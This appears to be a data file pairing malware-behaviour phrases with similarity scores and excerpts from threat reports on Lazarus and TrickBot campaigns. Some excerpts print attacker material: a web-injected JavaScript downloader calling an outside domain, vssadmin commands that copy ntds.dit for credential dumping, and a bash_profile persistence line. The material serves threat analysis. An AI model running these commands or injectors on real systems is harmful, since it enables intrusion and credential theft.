This could cause the file to run when double-clicked instead of opening it with a PDF viewer.|1.0|['This completes Lazaruss ability to target all major desktop operating systems.On March 20th, a user in the country of Georgia submitted to VirusTotal a ZIP archive calledHSBC job offer.pdf.zip.', 'Given other DreamJob campaigns by Lazarus, this payload was probably distributed through spearphishing or direct messages on LinkedIn.', 'The archive contains a single file: a native 64-bit Intel Linux binary written in Go and namedHSBC job offerpdf.Interestingly, the file extension is not.pdf.', 'This is because the apparent dot character in the filename is aleader dotrepresented by the U+2024 Unicode character.', 'The use of the leader dot in the filename was probably an attempt to trick the file manager into treating the file as an executable instead of a PDF.', 'This could cause the file to run when double-clicked instead of opening it with a PDF viewer.', 'On execution, a decoy PDF is displayed to the user usingxdg-open, which will open the document using the users preferred PDF viewer (see Figure 3).', 'We decided to call this ELF downloader OdicLoader, as it has a similar role as the IconicLoaders on other platforms and the payload is fetched from OpenDrive.OdicLoader drops a decoy PDF document, displays it using the systems default PDF viewer (see Figure 2), and then downloads a second-stage backdoor from theOpenDrivecloud service.', 'The downloaded file is stored in~/.config/guiconfigd(SHA-1:0CA1723AFE261CD85B05C9EF424FC50290DCE7DF).', 'We call this second-stage backdoor SimplexTea.As the last step of its execution, the OdicLoader modifies~/.bash_profile, so SimplexTea is launched with Bash and its output is muted (~/.config/guiconfigd >/dev/null 2>&1).Figure 2.', 'Illustration of the probable chain of compromiseFigure 3.']
injects into the svchost.exe process.|0.8152541032139251|['Most of the initial payloads in these campaigns are signed with valid certificates to evade security tools.', 'They abuse the relative trust that is given to signed binaries to avoid detection.', 'File metadata properties for the fake Microsoft Word Document.', 'Signed malware is an evasive initial entry point into an organization.', 'The message box distracts the user as TrickBots payload is downloaded, stored in the %TEMP% folder, and executed.', 'A new process injects the TrickBot payload into a svchost.exe process.', 'https://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware 3/239/17/2020 Dropping Anchor: From a TrickBot Infection to the Discovery of the Anchor Malware svchost.exe injected code malicious evidence as seen in the Cybereason Platform.', 'Domain associated with the TrickBot payload download.', 'The TrickBot Payload Once TrickBots main payload is injected into the svchost.exe process, it carries out a series of reconnaissance-related tasks to profile the infected endpoint and the network.', 'This information is crucial, as it determines the course of the attack.', 'Checking Network Connectivity TrickBot checks for Internet connectivity by trying to access several designated domains.']
injects into the svchost.exe process|0.8152541032139251|['Most of the initial payloads in these campaigns are signed with valid certificates to evade security tools.', 'They abuse the relative trust that is given to signed binaries to avoid detection.', 'File metadata properties for the fake Microsoft Word Document.', 'Signed malware is an evasive initial entry point into an organization.', 'The message box distracts the user as TrickBots payload is downloaded, stored in the %TEMP% folder, and executed.', 'A new process injects the TrickBot payload into a svchost.exe process.', 'https://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware 3/239/17/2020 Dropping Anchor: From a TrickBot Infection to the Discovery of the Anchor Malware svchost.exe injected code malicious evidence as seen in the Cybereason Platform.', 'Domain associated with the TrickBot payload download.', 'The TrickBot Payload Once TrickBots main payload is injected into the svchost.exe process, it carries out a series of reconnaissance-related tasks to profile the infected endpoint and the network.', 'This information is crucial, as it determines the course of the attack.', 'Checking Network Connectivity TrickBot checks for Internet connectivity by trying to access several designated domains.']
it searches for the .vnc.lnk affix to steal VNC credentials.|0.8126357610528071|"['If the browser version contains a vulnerability, corresponding exploitation code gets run on the target system, potentially giving the attacker a remote code execution ability.', 'For these types of attacks, adversaries often leverage JavaScript.', 'For instance, according to a malware analysis report performed by Palo Alto, analyzing threat samples from April 2022 to June 2022, among all of the web threats detected during the research, JavaScript downloaders and redirectors were in the top 5 most leveraged web threats, infecting around 300 different domains [31].', 'Analysis shows that attackers often inject malicious JavaScript downloaders to a webpage owned by them, creating several new script elements that redirect website visitors to ads, spams, or any other malicious domains such as train[.]developfirstline[.', ']com: .', '.', '.', 'Element.prototype.appendAfter = function(element) { element.parentNode.insertBefore(this, element.nextSibling) ), false(function () { var elem = document.createElement(\'script"") elem.type = \'text / javascript\' elem.sc = \'https://train.developfirstline.com/delivery.js?s=3\' elem.appendAfter(document.getElementsByTagName(\'script\')(0]) elem.appendAfter(document.getElementsByTagName(""\'head\')[0]) document.getElementsByTagName(\'head\')(01.appendChild(elem) .', '.', '.', '37#1.8.']"
uses HTTPS to communicate with its C2 servers|0.8538853320781743|"['3: VSingle makes way for YamaBot During one particular intrusion, the attackers first deployed VSingle on the endpoint.', 'However, after the VSingle sample was detected, the attackers were at risk of losing access to the enterprise.', 'Therefore, after repeated failed attempts to deploy VSingle on the endpoints, the attackers then deployed another updated copy of VSingle.', 'After maintaining continued access for a while, the attackers then moved on to the use of another implant YamaBot.', 'YamaBot is a custom-made GoLang-based malware family.', 'It uses HTTP to communicate with its C2 servers.', 'It typically begins by sending preliminary system information about the infected endpoint to the C2: computer name, username and MAC address.', ""10/20YamaBot's helper function names."", 'This implant has standard RAT capabilities, including the ability to: List files and directories.', 'Send process information to C2.', 'Download files from remote locations.']"
uses HTTPS to communicate with its C2 servers|0.8538853320781743|"['When files of particular interest are found they are put into a .rar archive for exfiltration, typically via one of the custom-developed implants running on the system.Victim No.', '3: VSingle makes way for YamaBotDuring one particular intrusion, the attackers first deployed VSingle on the endpoint.', 'However, after the VSingle sample was detected, the attackers were at risk of losing access to the enterprise.', 'Therefore, after repeated failed attempts to deploy VSingle on the endpoints, the attackers then deployed another updated copy of VSingle.', 'After maintaining continued access for a while, the attackers then moved on to the use of another implant YamaBot.YamaBot is a custom-made GoLang-based malware family.', 'It uses HTTP to communicate with its C2 servers.', ""It typically begins by sending preliminary system information about the infected endpoint to the C2: computer name, username and MAC address.YamaBot's helper function names.This implant has standard RAT capabilities, including the ability to:List files and directories.Send process information to C2.Download files from remote locations.Execute arbitrary commands on the endpoints.Uninstall itself.YamaBot was recently attributed to the Lazarus APT group byJPCERTwho provided an excellent analysis of the implant.Credential HarvestingApart from the usual recon and deployment of the custom implants, we also observed Lazarus' use of completely different TTPs for credential harvesting."", 'The attackers created backups of volumes that were then used to create a copy of the ""ntds.dit"" file for exfiltration containing Active Directory data.CommandIntentvssadmin list shadows /for=C: ^> <local_path>\\\\<log_file> > <local_path>\\\\execute.bat & C:\\\\Windows\\\\system32\\\\cmd.exe /Q /c <local_path>\\\\execute.bat & del <local_path>\\\\execute.batSystem Information Discovery [T1082]vssadmin create shadow /For=C: ^> <local_path>\\\\<log_file> > <local_path>\\\\execute.bat & C:\\\\Windows\\\\system32\\\\cmd.exe /Q /c <local_path>\\\\execute.bat & del <local_path>\\\\execute.batOS Credential Dumping: NTDS [T1003/003]cmd.exe /C copy \\\\\\\\?\\\\GLOBALROOT\\\\Device\\\\HarddiskVolumeShadowCopy1\\\\Windows\\\\NTDS\\\\ntds.dit <local_path>\\\\phPzFvOU.tmp ^> <local_path>\\\\<log_file> > <local_path>\\\\execute.bat & C:\\\\Windows\\\\system32\\\\cmd.exe /Q /c <local_path>\\\\execute.bat & del <local_path>\\\\execute.batOS Credential Dumping: NTDS [T1003/003]The Variations in the playbookThe overall structure of the infection chains remained the same across multiple intrusions in this campaign, primarily consisting of the cyber kill chain that we illustrated at the beginning of the campaign section.However, there were some key variations that consist of some optional activities conducted by the adversary in different intrusion sets.', ""These variations include the use of:Credential harvesting using tools such as Mimikatz and Procdump.Proxy tools to set up SOCKs proxies.Reverse tunneling tools such as PuTTY's plink.It is therefore necessary to list all the TTPs used by the adversary across all the intrusions we've discovered in this campaign."", ""This section provides an additional list of TTPs and commands used by the operators along with their corresponding MITRE ATT&CK IDs to help defenders better understand this APT's offensive playbook.Note:There is some overlap between operations (common or similar commands) carried out via the reverse shell, the VSingle RAT and impacket tools."", 'This could be because there might be multiple human operators manually executing their own set of commands based on their shift days and timings (without proper handover of information collected and percolated from one operator to another).For example, in one instance, the attackers tried to obtain Active Directory information on one endpoint via PowerShell cmdlets.']"
